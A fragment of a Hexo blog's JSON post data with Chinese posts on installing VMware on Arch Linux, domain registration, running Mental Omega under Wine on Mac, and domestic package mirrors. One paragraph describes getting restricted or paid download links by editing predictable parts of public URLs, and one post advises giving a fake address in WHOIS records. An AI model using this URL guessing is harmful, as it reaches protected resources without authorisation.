id=\"其他的话\"><a href=\"#其他的话\" class=\"headerlink\" title=\"其他的话\"></a>其他的话</h2><p>这也不是我第一次干这种事了，基本情况就是下载网址A被大家所知道，但是下载网址B需要通过一定权限才能获取的，然后最关键的是，网址A能够推理出网址B，通常情况下网址里面包含了固定的信息，例如日期，可以直接修改得到。当然，如果有一点随机字符串，就没法获得了。</p>\n<p>这个问题相信以前国内的各种下载站都会有过，不过现在应该好多了，但是很多公司自己的软件或者付费下载可能仍然存在这样的问题。如果能够获得一个网址，例如试用版软件或者免费资源，就能够进一步推导出其他资源的网址，当然前提是文件名能够直接从网页上获取到。</p>\n<h2 id=\"安装Vmware-Workstation中的其他问题\"><a href=\"#安装Vmware-Workstation中的其他问题\" class=\"headerlink\" title=\"安装Vmware Workstation中的其他问题\"></a>安装Vmware Workstation中的其他问题</h2><p>参考了很多<a href=\"https://wiki.archlinux.org/index.php/Vmware\">Wiki</a>上的内容</p>\n<h4 id=\"无-etc-init-d目录\"><a href=\"#无-etc-init-d目录\" class=\"headerlink\" title=\"无&#x2F;etc&#x2F;init.d目录\"></a>无&#x2F;etc&#x2F;init.d目录</h4><p>Archlinux的启动改为systemctl，因此不再有&#x2F;etc&#x2F;init.d目录，解决方法是直接忽略错误，然后手工写一个service文件就行了。</p>\n<h4 id=\"编译模块时出错\"><a href=\"#编译模块时出错\" class=\"headerlink\" title=\"编译模块时出错\"></a>编译模块时出错</h4><ol>\n<li>缺少header.h</li>\n</ol>\n<p>查看日志，发现是缺少linux头文件中的header.h，利用locate命令查找到对应的version.h文件，然后创建软链接</p>\n<p><code>sudo ln /usr/include/linux/version.h /lib/modules/3.17.6-1-ARCH/build/include/linux/version.h</code></p>\n<ol start=\"2\">\n<li>打补丁</li>\n</ol>\n<p>解决了header.h之后，发现还是编译不通过，这下就傻眼了（本事不济搞不定啊！），不过通过搜索后，发现其实Arch Wiki上都写明了，安装软件<a href=\"https://aur.archlinux.org/packages/vmware-patch/\">vmware-patch</a>就行了，一看这个软件，就已经为10.0.4更新过了，<strong>又让我对Arch产生了进一步的好感，无所不能啊！</strong></p>\n<p>总结就是，有问题，搜<strong>Arch Linux英文Wiki！</strong></p>\n"},{"title":"域名注册经历","date":"2018-01-28T17:13:50.000Z","_content":"\n## 注册域名\n\n首先要挑选一个域名后缀，然后从域名比价网站[domcomp](https://www.domcomp.com/)挑选一个合适的供应商进行注册。一般站点首次购买较为便宜，但是续费就有点贵，可以在到期前转移到续费便宜的站点再进行续费。此外，挑选的时候我特意选择了一家免费赠送隐私保护功能的供应商，但是即时这样仍然建议使用假的地址，配置Google Voice 作为联系方式，并单独注册一个邮箱接受相关信息。Whois信息现在已经被用于追踪用户的重要信息，因此一定要进行保密。\n\n## 域名解析\n\n目前国内的域名解析都需要实名认证，因此选择CloudFlare进行解析，具体的修改流程比较简单，注册后按照提示输入域名，然后再返回域名供应商修改对应的解析服务器到CloudFlare，一旦CloudFlare确认后就能够直接进行修改了。\n","source":"_posts/Website.md","raw":"title: 域名注册经历\ndate: 2018-01-28 17:13:50\ntags:\n---\n\n## 注册域名\n\n首先要挑选一个域名后缀，然后从域名比价网站[domcomp](https://www.domcomp.com/)挑选一个合适的供应商进行注册。一般站点首次购买较为便宜，但是续费就有点贵，可以在到期前转移到续费便宜的站点再进行续费。此外，挑选的时候我特意选择了一家免费赠送隐私保护功能的供应商，但是即时这样仍然建议使用假的地址，配置Google Voice 作为联系方式，并单独注册一个邮箱接受相关信息。Whois信息现在已经被用于追踪用户的重要信息，因此一定要进行保密。\n\n## 域名解析\n\n目前国内的域名解析都需要实名认证，因此选择CloudFlare进行解析，具体的修改流程比较简单，注册后按照提示输入域名，然后再返回域名供应商修改对应的解析服务器到CloudFlare，一旦CloudFlare确认后就能够直接进行修改了。\n","slug":"Website","published":1,"updated":"2020-09-07T02:31:06.570Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmz001mxrn54zckdarv","content":"<h2 id=\"注册域名\"><a href=\"#注册域名\" class=\"headerlink\" title=\"注册域名\"></a>注册域名</h2><p>首先要挑选一个域名后缀，然后从域名比价网站<a href=\"https://www.domcomp.com/\">domcomp</a>挑选一个合适的供应商进行注册。一般站点首次购买较为便宜，但是续费就有点贵，可以在到期前转移到续费便宜的站点再进行续费。此外，挑选的时候我特意选择了一家免费赠送隐私保护功能的供应商，但是即时这样仍然建议使用假的地址，配置Google Voice 作为联系方式，并单独注册一个邮箱接受相关信息。Whois信息现在已经被用于追踪用户的重要信息，因此一定要进行保密。</p>\n<h2 id=\"域名解析\"><a href=\"#域名解析\" class=\"headerlink\" title=\"域名解析\"></a>域名解析</h2><p>目前国内的域名解析都需要实名认证，因此选择CloudFlare进行解析，具体的修改流程比较简单，注册后按照提示输入域名，然后再返回域名供应商修改对应的解析服务器到CloudFlare，一旦CloudFlare确认后就能够直接进行修改了。</p>\n","excerpt":"","more":"<h2 id=\"注册域名\"><a href=\"#注册域名\" class=\"headerlink\" title=\"注册域名\"></a>注册域名</h2><p>首先要挑选一个域名后缀，然后从域名比价网站<a href=\"https://www.domcomp.com/\">domcomp</a>挑选一个合适的供应商进行注册。一般站点首次购买较为便宜，但是续费就有点贵，可以在到期前转移到续费便宜的站点再进行续费。此外，挑选的时候我特意选择了一家免费赠送隐私保护功能的供应商，但是即时这样仍然建议使用假的地址，配置Google Voice 作为联系方式，并单独注册一个邮箱接受相关信息。Whois信息现在已经被用于追踪用户的重要信息，因此一定要进行保密。</p>\n<h2 id=\"域名解析\"><a href=\"#域名解析\" class=\"headerlink\" title=\"域名解析\"></a>域名解析</h2><p>目前国内的域名解析都需要实名认证，因此选择CloudFlare进行解析，具体的修改流程比较简单，注册后按照提示输入域名，然后再返回域名供应商修改对应的解析服务器到CloudFlare，一旦CloudFlare确认后就能够直接进行修改了。</p>\n"},{"title":"Mac下Wine运行心灵终结Mental Omega 3.3","date":"2017-10-21T17:53:12.000Z","_content":"\n---\n\n# Mac下Wine运行心灵终结Mental Omega 3.3\n\n## 简介\n\n红色警戒(Command & Conquer: Red Alert 2)是经典的游戏，心灵终结是基于尤里的复仇的一个Mod，被称为\"几乎完美的尤里的复仇\"，2016年底该Mod发布3.3版本。相比原版的红警，阵营间的兵种区分更大，兵种相克更加合理，增加了多种对战模式，玩起来更加有意思。\n\n## 安装Wine\n\nWine可以在Linux/Mac平台下模拟执行Window程序\n\n请安装开发版本的Wine以便获得更好的兼容性\n\n```\nbrew cask install wine-devel\nbrew install winetricks\n```\n\n## 安装Mental Omega 3.3\n\n请安装3.3.2版本，最早的MentalOmega 3.3.0版本的clientxna.exe无法正常启动，需要后续更新才行，该问题可以参考(https://github.com/CnCNet/xna-cncnet-client/issues/29)\n\n选择一个心灵终结的懒人包，解压之后运行\n\n```\nwinetricks xna40\n```\n\n会自动安装依赖.net40和xna40，安装完毕后如果直接运行`wine MentalOmegaClient.exe`仍然会提示缺少.NET组件，但是可以通过`wine Resources/clientxna.exe`来开启程序绕过检查。\n\n![Wine](/img/wine-MentalOmega.png)\n\n## 其他优化\n\n关于Wine的字体优化，可以参考[WINE界面与字体美化全攻略，及我的常用WINE程序截图展示](https://www.lulinux.com/archives/362)\n\n## 目前遇到的Bug\n\n- 1.会经常性的在命令行窗口弹出错误信息：\n\n>  winedevice.exe(18227,0xb0004000) malloc: *** error for object 0x40203bb2: pointer being freed was not allocated\n\n- 2.在长时间运行红警后，会出现闪退现象\n\n\n# 更新日志\n\n2019.06.22 更新最新的 Wine 使用情况。\n\n# 参考文档\n\n[【WineHQ】解决UTF8乱码问题](https://blog.csdn.net/wr132/article/details/76093911)","source":"_posts/Wine-Mental-Omega.md","raw":"\ntitle:  Mac下Wine运行心灵终结Mental Omega 3.3\ndate: 2017-10-21 17:53:12\ntags: [\"Mac\", \"Linux\"]\n---\n\n---\n\n# Mac下Wine运行心灵终结Mental Omega 3.3\n\n## 简介\n\n红色警戒(Command & Conquer: Red Alert 2)是经典的游戏，心灵终结是基于尤里的复仇的一个Mod，被称为\"几乎完美的尤里的复仇\"，2016年底该Mod发布3.3版本。相比原版的红警，阵营间的兵种区分更大，兵种相克更加合理，增加了多种对战模式，玩起来更加有意思。\n\n## 安装Wine\n\nWine可以在Linux/Mac平台下模拟执行Window程序\n\n请安装开发版本的Wine以便获得更好的兼容性\n\n```\nbrew cask install wine-devel\nbrew install winetricks\n```\n\n## 安装Mental Omega 3.3\n\n请安装3.3.2版本，最早的MentalOmega 3.3.0版本的clientxna.exe无法正常启动，需要后续更新才行，该问题可以参考(https://github.com/CnCNet/xna-cncnet-client/issues/29)\n\n选择一个心灵终结的懒人包，解压之后运行\n\n```\nwinetricks xna40\n```\n\n会自动安装依赖.net40和xna40，安装完毕后如果直接运行`wine MentalOmegaClient.exe`仍然会提示缺少.NET组件，但是可以通过`wine Resources/clientxna.exe`来开启程序绕过检查。\n\n![Wine](/img/wine-MentalOmega.png)\n\n## 其他优化\n\n关于Wine的字体优化，可以参考[WINE界面与字体美化全攻略，及我的常用WINE程序截图展示](https://www.lulinux.com/archives/362)\n\n## 目前遇到的Bug\n\n- 1.会经常性的在命令行窗口弹出错误信息：\n\n>  winedevice.exe(18227,0xb0004000) malloc: *** error for object 0x40203bb2: pointer being freed was not allocated\n\n- 2.在长时间运行红警后，会出现闪退现象\n\n\n# 更新日志\n\n2019.06.22 更新最新的 Wine 使用情况。\n\n# 参考文档\n\n[【WineHQ】解决UTF8乱码问题](https://blog.csdn.net/wr132/article/details/76093911)","slug":"Wine-Mental-Omega","published":1,"updated":"2020-09-07T02:31:06.572Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmz001pxrn59ne4dpoa","content":"<hr>\n<h1 id=\"Mac下Wine运行心灵终结Mental-Omega-3-3\"><a href=\"#Mac下Wine运行心灵终结Mental-Omega-3-3\" class=\"headerlink\" title=\"Mac下Wine运行心灵终结Mental Omega 3.3\"></a>Mac下Wine运行心灵终结Mental Omega 3.3</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>红色警戒(Command &amp; Conquer: Red Alert 2)是经典的游戏，心灵终结是基于尤里的复仇的一个Mod，被称为”几乎完美的尤里的复仇”，2016年底该Mod发布3.3版本。相比原版的红警，阵营间的兵种区分更大，兵种相克更加合理，增加了多种对战模式，玩起来更加有意思。</p>\n<h2 id=\"安装Wine\"><a href=\"#安装Wine\" class=\"headerlink\" title=\"安装Wine\"></a>安装Wine</h2><p>Wine可以在Linux&#x2F;Mac平台下模拟执行Window程序</p>\n<p>请安装开发版本的Wine以便获得更好的兼容性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install wine-devel</span><br><span class=\"line\">brew install winetricks</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装Mental-Omega-3-3\"><a href=\"#安装Mental-Omega-3-3\" class=\"headerlink\" title=\"安装Mental Omega 3.3\"></a>安装Mental Omega 3.3</h2><p>请安装3.3.2版本，最早的MentalOmega 3.3.0版本的clientxna.exe无法正常启动，需要后续更新才行，该问题可以参考(<a href=\"https://github.com/CnCNet/xna-cncnet-client/issues/29\">https://github.com/CnCNet/xna-cncnet-client/issues/29</a>)</p>\n<p>选择一个心灵终结的懒人包，解压之后运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winetricks xna40</span><br></pre></td></tr></table></figure>\n\n<p>会自动安装依赖.net40和xna40，安装完毕后如果直接运行<code>wine MentalOmegaClient.exe</code>仍然会提示缺少.NET组件，但是可以通过<code>wine Resources/clientxna.exe</code>来开启程序绕过检查。</p>\n<p><img src=\"/img/wine-MentalOmega.png\" alt=\"Wine\"></p>\n<h2 id=\"其他优化\"><a href=\"#其他优化\" class=\"headerlink\" title=\"其他优化\"></a>其他优化</h2><p>关于Wine的字体优化，可以参考<a href=\"https://www.lulinux.com/archives/362\">WINE界面与字体美化全攻略，及我的常用WINE程序截图展示</a></p>\n<h2 id=\"目前遇到的Bug\"><a href=\"#目前遇到的Bug\" class=\"headerlink\" title=\"目前遇到的Bug\"></a>目前遇到的Bug</h2><ul>\n<li>1.会经常性的在命令行窗口弹出错误信息：</li>\n</ul>\n<blockquote>\n<p> winedevice.exe(18227,0xb0004000) malloc: *** error for object 0x40203bb2: pointer being freed was not allocated</p>\n</blockquote>\n<ul>\n<li>2.在长时间运行红警后，会出现闪退现象</li>\n</ul>\n<h1 id=\"更新日志\"><a href=\"#更新日志\" class=\"headerlink\" title=\"更新日志\"></a>更新日志</h1><p>2019.06.22 更新最新的 Wine 使用情况。</p>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><p><a href=\"https://blog.csdn.net/wr132/article/details/76093911\">【WineHQ】解决UTF8乱码问题</a></p>\n","excerpt":"","more":"<hr>\n<h1 id=\"Mac下Wine运行心灵终结Mental-Omega-3-3\"><a href=\"#Mac下Wine运行心灵终结Mental-Omega-3-3\" class=\"headerlink\" title=\"Mac下Wine运行心灵终结Mental Omega 3.3\"></a>Mac下Wine运行心灵终结Mental Omega 3.3</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>红色警戒(Command &amp; Conquer: Red Alert 2)是经典的游戏，心灵终结是基于尤里的复仇的一个Mod，被称为”几乎完美的尤里的复仇”，2016年底该Mod发布3.3版本。相比原版的红警，阵营间的兵种区分更大，兵种相克更加合理，增加了多种对战模式，玩起来更加有意思。</p>\n<h2 id=\"安装Wine\"><a href=\"#安装Wine\" class=\"headerlink\" title=\"安装Wine\"></a>安装Wine</h2><p>Wine可以在Linux&#x2F;Mac平台下模拟执行Window程序</p>\n<p>请安装开发版本的Wine以便获得更好的兼容性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install wine-devel</span><br><span class=\"line\">brew install winetricks</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装Mental-Omega-3-3\"><a href=\"#安装Mental-Omega-3-3\" class=\"headerlink\" title=\"安装Mental Omega 3.3\"></a>安装Mental Omega 3.3</h2><p>请安装3.3.2版本，最早的MentalOmega 3.3.0版本的clientxna.exe无法正常启动，需要后续更新才行，该问题可以参考(<a href=\"https://github.com/CnCNet/xna-cncnet-client/issues/29\">https://github.com/CnCNet/xna-cncnet-client/issues/29</a>)</p>\n<p>选择一个心灵终结的懒人包，解压之后运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">winetricks xna40</span><br></pre></td></tr></table></figure>\n\n<p>会自动安装依赖.net40和xna40，安装完毕后如果直接运行<code>wine MentalOmegaClient.exe</code>仍然会提示缺少.NET组件，但是可以通过<code>wine Resources/clientxna.exe</code>来开启程序绕过检查。</p>\n<p><img src=\"/img/wine-MentalOmega.png\" alt=\"Wine\"></p>\n<h2 id=\"其他优化\"><a href=\"#其他优化\" class=\"headerlink\" title=\"其他优化\"></a>其他优化</h2><p>关于Wine的字体优化，可以参考<a href=\"https://www.lulinux.com/archives/362\">WINE界面与字体美化全攻略，及我的常用WINE程序截图展示</a></p>\n<h2 id=\"目前遇到的Bug\"><a href=\"#目前遇到的Bug\" class=\"headerlink\" title=\"目前遇到的Bug\"></a>目前遇到的Bug</h2><ul>\n<li>1.会经常性的在命令行窗口弹出错误信息：</li>\n</ul>\n<blockquote>\n<p> winedevice.exe(18227,0xb0004000) malloc: *** error for object 0x40203bb2: pointer being freed was not allocated</p>\n</blockquote>\n<ul>\n<li>2.在长时间运行红警后，会出现闪退现象</li>\n</ul>\n<h1 id=\"更新日志\"><a href=\"#更新日志\" class=\"headerlink\" title=\"更新日志\"></a>更新日志</h1><p>2019.06.22 更新最新的 Wine 使用情况。</p>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><p><a href=\"https://blog.csdn.net/wr132/article/details/76093911\">【WineHQ】解决UTF8乱码问题</a></p>\n"},{"title":"常见软件包的国内镜像","date":"2016-01-10T23:45:19.000Z","_content":"\n\n在Linux/Mac上经常要使用各种软件库来下载资源，但是这些资源链接经常被墙，或者速度较慢，因此需要改用国内的镜像站点来加快速度。\n\n### 常见开源镜像站点\n\n这些站点包含常见各种的Linux软件源。\n\n[中国科技大学开源镜像](https://mirrors.ustc.edu.cn/)\n[清华大学开源镜像](http://mirrors.tuna.tsinghua.edu.cn/)\n[阿里云开源镜像](http://mirrors.aliyun.com/)\n\n其中中国科技大学使用的是https，因此在大多数情况下推荐使用（2016年底科大源曾长期处于不稳定状态，目前已经恢复），阿里云镜像适合阿里云的服务器使用，可以免流量且速度快。\n\n### 具体一些推荐配置\n\n#### python\n\n网上大多推荐豆瓣的源，但是豆瓣的源仍然是http协议，新版pip会提示警告，所以还是换成科大源吧（除非是低版本Linux不支持https链接）。此外，使用阿里源还遇到过几次同步不及时的问题。\n\n#### node\n\n推荐使用阿里源，主要是提供额外的cnpm命令，可以方便的安装。\n\n#### Ruby\n\n淘宝的Ruby镜像已经改由Ruby-China维护，所以请使用[Ruby-China的镜像](https://gems.ruby-china.org/)\n\n```\n$ gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/\n$ gem sources -l\nhttps://gems.ruby-china.org\n# 确保只有 gems.ruby-china.org\n```\n\n#### Android\n\n使用腾讯Bugly镜像，[将Android SDK Manager的代理设置为android-mirror.bugly.qq.com:8080](http://android-mirror.bugly.qq.com:8080/include/usage.html)\n\n#### homebrew\n\nhomebrew自身内容是放在github上的，如果更新速度慢，可以换成[清华的镜像](http://mirrors.tuna.tsinghua.edu.cn/help/#homebrew)：\n\n```\n$ cd /usr/local\n$ git remote set-url origin git://mirrors.tuna.tsinghua.edu.cn/homebrew.git\n```\n\nhomebrew-science或者homebrew-python也可以参考其页面进行修改。不过如果不是处于极其艰难的情况，不建议改这个，因为无法确保各个的软件包的hash未被篡改。\n\nhomebrew大多数的软件源都是在homebrew.bintray.com上的，速度同样非常慢，[有人](http://ban.ninja/)也做了份国内镜像。\n\n设置环境变量:\n\n```\nexport HOMEBREW_BOTTLE_DOMAIN=http://7xkcej.dl1.z0.glb.clouddn.com\n```\n\n#### Docker Hub\n\n国内基本斗士要注册的，科大源有个反向代理，因为Docker配置比较麻烦，请具体参考[Docker镜像使用帮助](https://lug.ustc.edu.cn/wiki/mirrors/help/docker)\n\n#### pyenv\n\n同样设置环境变量\n```\nexport PYTHON_BUILD_MIRROR_URL=\"http://pyenv.qiniudn.com/pythons/\"\n```\n\n#### 注意事项\n\n对于这些第三方源，并不能完全保重其安全性，所以会存在一定的风险下载到经过篡改的软件包。\n\n### 更新\n\n2017.01.21 更新多条源记录","source":"_posts/mirror.md","raw":"title: 常见软件包的国内镜像\ndate: 2016-01-10 23:45:19\ntags: [\"Linux\"]\n---\n\n\n在Linux/Mac上经常要使用各种软件库来下载资源，但是这些资源链接经常被墙，或者速度较慢，因此需要改用国内的镜像站点来加快速度。\n\n### 常见开源镜像站点\n\n这些站点包含常见各种的Linux软件源。\n\n[中国科技大学开源镜像](https://mirrors.ustc.edu.cn/)\n[清华大学开源镜像](http://mirrors.tuna.tsinghua.edu.cn/)\n[阿里云开源镜像](http://mirrors.aliyun.com/)\n\n其中中国科技大学使用的是https，因此在大多数情况下推荐使用（2016年底科大源曾长期处于不稳定状态，目前已经恢复），阿里云镜像适合阿里云的服务器使用，可以免流量且速度快。\n\n### 具体一些推荐配置\n\n#### python\n\n网上大多推荐豆瓣的源，但是豆瓣的源仍然是http协议，新版pip会提示警告，所以还是换成科大源吧（除非是低版本Linux不支持https链接）。此外，使用阿里源还遇到过几次同步不及时的问题。\n\n#### node\n\n推荐使用阿里源，主要是提供额外的cnpm命令，可以方便的安装。\n\n#### Ruby\n\n淘宝的Ruby镜像已经改由Ruby-China维护，所以请使用[Ruby-China的镜像](https://gems.ruby-china.org/)\n\n```\n$ gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/\n$ gem sources -l\nhttps://gems.ruby-china.org\n# 确保只有 gems.ruby-china.org\n```\n\n#### Android\n\n使用腾讯Bugly镜像，[将Android SDK Manager的代理设置为android-mirror.bugly.qq.com:8080](http://android-mirror.bugly.qq.com:8080/include/usage.html)\n\n#### homebrew\n\nhomebrew自身内容是放在github上的，如果更新速度慢，可以换成[清华的镜像](http://mirrors.tuna.tsinghua.edu.cn/help/#homebrew)：\n\n```\n$ cd /usr/local\n$ git remote set-url origin git://mirrors.tuna.tsinghua.edu.cn/homebrew.git\n```\n\nhomebrew-science或者homebrew-python也可以参考其页面进行修改。不过如果不是处于极其艰难的情况，不建议改这个，因为无法确保各个的软件包的hash未被篡改。\n\nhomebrew大多数的软件源都是在homebrew.bintray.com上的，速度同样非常慢，[有人](http://ban.ninja/)也做了份国内镜像。\n\n设置环境变量:\n\n```\nexport HOMEBREW_BOTTLE_DOMAIN=http://7xkcej.dl1.z0.glb.clouddn.com\n```\n\n#### Docker Hub\n\n国内基本斗士要注册的，科大源有个反向代理，因为Docker配置比较麻烦，请具体参考[Docker镜像使用帮助](https://lug.ustc.edu.cn/wiki/mirrors/help/docker)\n\n#### pyenv\n\n同样设置环境变量\n```\nexport PYTHON_BUILD_MIRROR_URL=\"http://pyenv.qiniudn.com/pythons/\"\n```\n\n#### 注意事项\n\n对于这些第三方源，并不能完全保重其安全性，所以会存在一定的风险下载到经过篡改的软件包。\n\n### 更新\n\n2017.01.21 更新多条源记录","slug":"mirror","published":1,"updated":"2020-09-07T02:31:06.572Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmn0001rxrn5a1kbftn9","content":"<p>在Linux&#x2F;Mac上经常要使用各种软件库来下载资源，但是这些资源链接经常被墙，或者速度较慢，因此需要改用国内的镜像站点来加快速度。</p>\n<h3 id=\"常见开源镜像站点\"><a href=\"#常见开源镜像站点\" class=\"headerlink\" title=\"常见开源镜像站点\"></a>常见开源镜像站点</h3><p>这些站点包含常见各种的Linux软件源。</p>\n<p><a href=\"https://mirrors.ustc.edu.cn/\">中国科技大学开源镜像</a><br><a href=\"http://mirrors.tuna.tsinghua.edu.cn/\">清华大学开源镜像</a><br><a href=\"http://mirrors.aliyun.com/\">阿里云开源镜像</a></p>\n<p>其中中国科技大学使用的是https，因此在大多数情况下推荐使用（2016年底科大源曾长期处于不稳定状态，目前已经恢复），阿里云镜像适合阿里云的服务器使用，可以免流量且速度快。</p>\n<h3 id=\"具体一些推荐配置\"><a href=\"#具体一些推荐配置\" class=\"headerlink\" title=\"具体一些推荐配置\"></a>具体一些推荐配置</h3><h4 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h4><p>网上大多推荐豆瓣的源，但是豆瓣的源仍然是http协议，新版pip会提示警告，所以还是换成科大源吧（除非是低版本Linux不支持https链接）。此外，使用阿里源还遇到过几次同步不及时的问题。</p>\n<h4 id=\"node\"><a href=\"#node\" class=\"headerlink\" title=\"node\"></a>node</h4><p>推荐使用阿里源，主要是提供额外的cnpm命令，可以方便的安装。</p>\n<h4 id=\"Ruby\"><a href=\"#Ruby\" class=\"headerlink\" title=\"Ruby\"></a>Ruby</h4><p>淘宝的Ruby镜像已经改由Ruby-China维护，所以请使用<a href=\"https://gems.ruby-china.org/\">Ruby-China的镜像</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/</span><br><span class=\"line\">$ gem sources -l</span><br><span class=\"line\">https://gems.ruby-china.org</span><br><span class=\"line\"># 确保只有 gems.ruby-china.org</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Android\"><a href=\"#Android\" class=\"headerlink\" title=\"Android\"></a>Android</h4><p>使用腾讯Bugly镜像，<a href=\"http://android-mirror.bugly.qq.com:8080/include/usage.html\">将Android SDK Manager的代理设置为android-mirror.bugly.qq.com:8080</a></p>\n<h4 id=\"homebrew\"><a href=\"#homebrew\" class=\"headerlink\" title=\"homebrew\"></a>homebrew</h4><p>homebrew自身内容是放在github上的，如果更新速度慢，可以换成<a href=\"http://mirrors.tuna.tsinghua.edu.cn/help/#homebrew\">清华的镜像</a>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd /usr/local</span><br><span class=\"line\">$ git remote set-url origin git://mirrors.tuna.tsinghua.edu.cn/homebrew.git</span><br></pre></td></tr></table></figure>\n\n<p>homebrew-science或者homebrew-python也可以参考其页面进行修改。不过如果不是处于极其艰难的情况，不建议改这个，因为无法确保各个的软件包的hash未被篡改。</p>\n<p>homebrew大多数的软件源都是在homebrew.bintray.com上的，速度同样非常慢，<a href=\"http://ban.ninja/\">有人</a>也做了份国内镜像。</p>\n<p>设置环境变量:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export HOMEBREW_BOTTLE_DOMAIN=http://7xkcej.dl1.z0.glb.clouddn.com</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Docker-Hub\"><a href=\"#Docker-Hub\" class=\"headerlink\" title=\"Docker Hub\"></a>Docker Hub</h4><p>国内基本斗士要注册的，科大源有个反向代理，因为Docker配置比较麻烦，请具体参考<a href=\"https://lug.ustc.edu.cn/wiki/mirrors/help/docker\">Docker镜像使用帮助</a></p>\n<h4 id=\"pyenv\"><a href=\"#pyenv\" class=\"headerlink\" title=\"pyenv\"></a>pyenv</h4><p>同样设置环境变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PYTHON_BUILD_MIRROR_URL=&quot;http://pyenv.qiniudn.com/pythons/&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h4><p>对于这些第三方源，并不能完全保重其安全性，所以会存在一定的风险下载到经过篡改的软件包。</p>\n<h3 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h3><p>2017.01.21 更新多条源记录</p>\n","excerpt":"","more":"<p>在Linux&#x2F;Mac上经常要使用各种软件库来下载资源，但是这些资源链接经常被墙，或者速度较慢，因此需要改用国内的镜像站点来加快速度。</p>\n<h3 id=\"常见开源镜像站点\"><a href=\"#常见开源镜像站点\" class=\"headerlink\" title=\"常见开源镜像站点\"></a>常见开源镜像站点</h3><p>这些站点包含常见各种的Linux软件源。</p>\n<p><a href=\"https://mirrors.ustc.edu.cn/\">中国科技大学开源镜像</a><br><a href=\"http://mirrors.tuna.tsinghua.edu.cn/\">清华大学开源镜像</a><br><a href=\"http://mirrors.aliyun.com/\">阿里云开源镜像</a></p>\n<p>其中中国科技大学使用的是https，因此在大多数情况下推荐使用（2016年底科大源曾长期处于不稳定状态，目前已经恢复），阿里云镜像适合阿里云的服务器使用，可以免流量且速度快。</p>\n<h3 id=\"具体一些推荐配置\"><a href=\"#具体一些推荐配置\" class=\"headerlink\" title=\"具体一些推荐配置\"></a>具体一些推荐配置</h3><h4 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h4><p>网上大多推荐豆瓣的源，但是豆瓣的源仍然是http协议，新版pip会提示警告，所以还是换成科大源吧（除非是低版本Linux不支持https链接）。此外，使用阿里源还遇到过几次同步不及时的问题。</p>\n<h4 id=\"node\"><a href=\"#node\" class=\"headerlink\" title=\"node\"></a>node</h4><p>推荐使用阿里源，主要是提供额外的cnpm命令，可以方便的安装。</p>\n<h4 id=\"Ruby\"><a href=\"#Ruby\" class=\"headerlink\" title=\"Ruby\"></a>Ruby</h4><p>淘宝的Ruby镜像已经改由Ruby-China维护，所以请使用<a href=\"https://gems.ruby-china.org/\">Ruby-China的镜像</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/</span><br><span class=\"line\">$ gem sources -l</span><br><span class=\"line\">https://gems.ruby-china.org</span><br><span class=\"line\"># 确保只有 gems.ruby-china.org</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Android\"><a href=\"#Android\" class=\"headerlink\" title=\"Android\"></a>Android</h4><p>使用腾讯Bugly镜像，<a href=\"http://android-mirror.bugly.qq.com:8080/include/usage.html\">将Android SDK Manager的代理设置为android-mirror.bugly.qq.com:8080</a></p>\n<h4 id=\"homebrew\"><a href=\"#homebrew\" class=\"headerlink\" title=\"homebrew\"></a>homebrew</h4><p>homebrew自身内容是放在github上的，如果更新速度慢，可以换成<a href=\"http://mirrors.tuna.tsinghua.edu.cn/help/#homebrew\">清华的镜像</a>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd /usr/local</span><br><span class=\"line\">$ git remote 